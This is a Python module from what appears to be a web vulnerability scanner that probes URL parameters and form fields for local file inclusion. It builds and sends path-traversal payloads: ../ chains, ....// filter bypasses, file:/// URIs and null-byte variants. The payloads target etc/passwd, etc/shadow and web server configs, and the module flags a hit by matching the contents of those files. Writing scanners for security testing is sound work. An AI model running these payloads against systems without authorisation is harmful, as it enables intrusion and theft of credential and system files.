import requests
import re
from activeScanRules.fileInclusionScanRules.scanFileInclusion import FileInclusionScanner

class ScanLocalFileInclusion(FileInclusionScanner):
    def __init__(self, host_os=None, visited_urls=None, log_file=None):
        self.host_os = host_os
        super().__init__(visited_urls, log_file)

    def initialise_payload_prefixes(self):
        linux_prefixes = [
            r"",
            r"/",
            r"//",
            r"///",
            r"////",
            r"/////",
            r"//////",
            r"./",
            r"../",
            r"../../",
            r"../../../",
            r"../../../../",
            r"../../../../../",
            r"../../../../../../",
            r"../../../../../../../../../../../../../../../../",
            r"....//",
            r"....//....//",
            r"....//....//....//",
            r"....//....//....//....//",
            r"....//....//....//....//....//",
            r"....//....//....//....//....//....//",
            r"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//",
            r"file:///",
            r"file:\\\\\\"
        ]
        windows_prefixes = ["",
            r"c:/",
            r"C:/",
            r"/",
            r"c:\\",
            r"C:\\",
            r"../../../../../../../../../../../../../../../../",
            r"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
            r"/../../../../../../../../../../../../../../../../",
            r"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
            r"file:///c:/",
            r"file:///c:\\",
            r"file:\\\\\\c:\\",
            r"file:\\\\\\c:/",
            r"file:///",
            r"file:\\\\\\",
            r"d:\\",
            r"D:\\",
            r"d:/",
            r"D:/",
            r"file:///d:/",
            r"file:///d:\\",
            r"file:\\\\\\d:\\",
            r"file:\\\\\\d:/"
        ]
        if self.host_os == "unix":
            return linux_prefixes
        elif self.host_os == "windows":
            return windows_prefixes
        else:
            self.logger.info("\tInvalid or unspecified host operating system. Defaulting to Unix payloads.")
            return linux_prefixes

    def initialise_file_targets(self):
        linux_local_file_targets = [
            r"etc/passwd",
            r"etc/group",
            r"etc/shadow",
            r"etc/hostname", # pull hostname from nmap scan
            r"etc/apache2/apache2.conf",
            r"etc/nginx/nginx.conf"
        ]
        windows_local_file_targets = [
            r"Windows/system.ini"
        ]
        if self.host_os == "unix":
            return linux_local_file_targets
        elif self.host_os == "windows":
            return windows_local_file_targets
        else:
            self.logger.info("\tInvalid or unspecified host operating system. Defaulting to Unix payloads.")
            return linux_local_file_targets

    def initialise_file_patterns(self):
        linux_local_file_patterns = [
            re.compile(r"root:.:0:0"),
            #re.compile(r"^[^:]+:[^:]+:[^:]+:[^:]+:[^:]+:[^:]+:[^:]+$"),
            #re.compile(r"^.+$"),
            #re.compile(r"<VirtualHost[^>]*>[^<]*</VirtualHost>"),
            #re.compile(r"server\s*{.*?}")
        ]
        windows_local_file_patterns = [
            re.compile(r"^\[drivers]$"),
        ]
        if self.host_os == "unix":
            return linux_local_file_patterns
        elif self.host_os == "windows":
            return windows_local_file_patterns
        else:
            self.logger.info("\tInvalid or unspecified host operating system. Defaulting to Unix payloads.")
            return linux_local_file_patterns

    def construct_payloads(self):
        prefixes = self.initialise_payload_prefixes()
        local_file_targets = self.initialise_file_targets()
        payloads = []
        for target in local_file_targets:
            for prefix in prefixes:
                payload = prefix + target
                payloads.append(payload)
        return payloads

    def test_payloads(self, base_url, url_params, html_content):
        if html_content is None:
            self.logger.error(f"\tFailed to retrieve HTML content from {base_url}. Skipping...")
            return
        potential_vulnerability_found = False
        payload_combinations = self.construct_payloads()
        for payload in payload_combinations:
            try:
                modified_url = self.construct_modified_url(base_url, url_params, payload)
                self.logger.info(f"\tTesting payload: {payload} on {base_url} as {modified_url}")
                # Send HTTP request to the modified URL
                response = requests.get(modified_url)
                attack_type = "url"
                if self.check_response(response, payload, modified_url, html_content, attack_type):
                    potential_vulnerability_found = True
                    break
            except Exception as e:
                self.logger.error(f"\tAn error occurred while testing local file inclusion in URL parameter: {e}")

        if not potential_vulnerability_found: # retry with null byte
            for payload in payload_combinations:
                try:
                    modified_url = self.construct_modified_url(base_url, url_params, payload + "%00")
                    self.logger.info(
                        f"\tTesting payload with null byte affixed: {payload} on {base_url} as {modified_url}")
                    # Send HTTP request to the modified URL
                    response = requests.get(modified_url)
                    attack_type = "url"
                    if self.check_response(response, payload, modified_url, html_content, attack_type):
                        potential_vulnerability_found = True
                        break
                except Exception as e:
                    self.logger.error(
                        f"\tAn error occurred while testing local file inclusion in URL parameter with null byte affixed: {e}")

        if not potential_vulnerability_found:
            self.logger.info(
                f"\tNo local file inclusion vulnerability found in URL parameters at: {base_url}")
            print(f"\033[32m[+] No local file inclusion vulnerability found at: {base_url}\033[0m")

    def test_form_payloads(self, target_url, form_fields, html_content):
        payloads = self.construct_payloads()
        potential_vulnerability_found = False
        proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
        for payload in payloads:
            self.logger.info(f"\tTesting payload: {payload} on {target_url}")
            try:
                form_data = {}
                for field_tuple in form_fields:
                    form_data[field_tuple[0]] = payload
                response = requests.post(target_url, data=form_data) # , proxies=proxies
                attack_type = "form"
                if self.check_response(response, payload, target_url, html_content, attack_type):
                    potential_vulnerability_found = True
                    break
            except Exception as e:
                self.logger.error(
                    f"\tAn error occurred while testing form with payload in {target_url}: {e}")

        if not potential_vulnerability_found:
            self.logger.info(f"\tNo local file inclusion vulnerability found in forms at: {target_url}")
            print(f"\033[32m[+] No local file inclusion vulnerability found in forms at: {target_url}\033[0m")

    def check_response(self, response, payload, url, html_content, attack_type):
        if response.status_code == 200:
            if response.text != html_content:
                for pattern in self.initialise_file_patterns():
                    if pattern.search(response.text):
                        self.logger.warning(f"Local file inclusion vulnerability "
                                         f"found at: {url} with payload: {payload}")
                        print(f"\033[31m[+] Local file inclusion vulnerability "
                              f"found at: {url} with payload: {payload} via {attack_type}\033[0m")
                        return True
        else:
            self.logger.error(f"Unexpected response code ({response.status_code}) for {url}")

